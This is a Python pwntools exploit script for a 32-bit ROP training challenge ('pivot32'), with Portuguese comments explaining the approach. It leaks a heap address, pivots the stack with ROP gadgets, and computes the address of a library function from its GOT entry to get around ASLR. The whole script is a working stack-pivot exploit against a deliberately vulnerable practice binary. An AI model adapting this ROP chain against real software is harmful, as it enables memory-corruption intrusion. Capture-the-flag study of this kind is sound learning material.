#!/usr/bin/env python2
# coding: utf-8

from pwn import *

elf = elf.context = ELF('pivot32')
p = process(elf.path)

### EXPLAINED ###
'''
Não temos espaço o suficiente para escrever nosso exploit corretamente na stack pois o espaço é limitado
Porém tem outro buffer que tem um espaço grande (não tenho certeza mas me pareçe ser na memória heap, enfim, posso estar errado...)
O endereço para essa região de memória o programa nos dá, mas ele é randomizado a cada execução devido ao ASLR
Então precisamos vazar esse endereço e formata-lo em tempo de execução
Vou explicando o resto conforme for escrevendo
'''

# leak heap address
heap_address = p32(int(p.recvuntil('Send')[-15:].strip('Send\n').encode(), 16))

'''
Por conta do ASLR precisamos vazar o endereço da libc, vazaremos usando a função foothold (o desafio recomanda essa, poderia vazar a puts também)
Essa função não é chamada no binário então devemos executar ela pelo menos uma vez por conta do lazy binding para ela ser carregada e salva na .got.plt
Com esse endereço em mão precisamos acessar a função ret2win para pegar a flag, porém essa função não é chamada e nem está no binário, ela está na libc
Vamos subtrair o offset da foothold com a da ret2win para depois somarmos com a foothold já resolvida
Imagina o seguinte:
endereço_base - 10
endereço_foothold - 12
offset_ret2win - 3
offset_foothold - 2

mas isso não é tão simples quando trabalhamso com números em hexa etc, o que eu quero te mostrar é o seguinte:
suponha que você não tem o endereço base, apenas o endereço_foothold e os offset's, como poderiamos descobrir o endereço da ret2win
12 - 2 = 10 (endereço base)
10 + 3 = 13 (endereço ret2win)

outra forma(estamos usando essa):
3 - 2 = 1
12 + 1 = 13

enfim, fazemos tudo isso simplesmente para achar o endereço da ret2win
'''
pop_eax = p32(0x0804882c) # pop eax ; ret
xchg_eax_esp = p32(0x0804882e) # xchg eax, esp ; ret

foothold_plt = p32(0x08048520)
foothold_got = p32(0x0804a024)

ret2win_offset = 0x00000974
foothold_offset = 0x0000077d

xpl_pivoting = b''
xpl_pivoting += b'A' * 44

xpl_pivoting += pop_eax
xpl_pivoting += heap_address # eax = heap_address
xpl_pivoting += xchg_eax_esp # trocamos o endereço de eax com o de esp, ou seja, estamo fazendo o pivoting

# leak address from ret2win and call

offset_calc = p32(ret2win_offset - foothold_offset)
mov_eax_value_of_eax = p32(0x08048830) # mov eax, dword ptr [eax] ; ret
pop_ebx = p32(0x080484a9) # pop ebx ; ret
add_eax_ebx = p32(0x08048833) # add eax, ebx ; ret
call_eax = p32(0x080485f0) # call eax

xpl_call = foothold_plt # chamando a primeira vez
xpl_call += pop_eax
xpl_call += foothold_got # eax = endereço efetivo de foothold@got
xpl_call += mov_eax_value_of_eax # conteudo de eax vai para o endereço de eax, ou seja, o endereço de foothold vai para eax
xpl_call += pop_ebx
xpl_call += offset_calc # ebx = ret2win_offset - foothold_offset
xpl_call += add_eax_ebx # eax + ebx, ou seja, foothold@got + (ret2win_offset - foothold_offset)
xpl_call += call_eax # call ret2win()

# primeiros executamos a ret2win e depois fazemos o pivoting, até porque para fazer o pivoting o nosso espaço se limita mais pois temos o padding de 44 
p.recvuntil('> ')
p.sendline(xpl_call)
p.recvuntil('> ')

p.sendline(xpl_pivoting)
p.interactive()
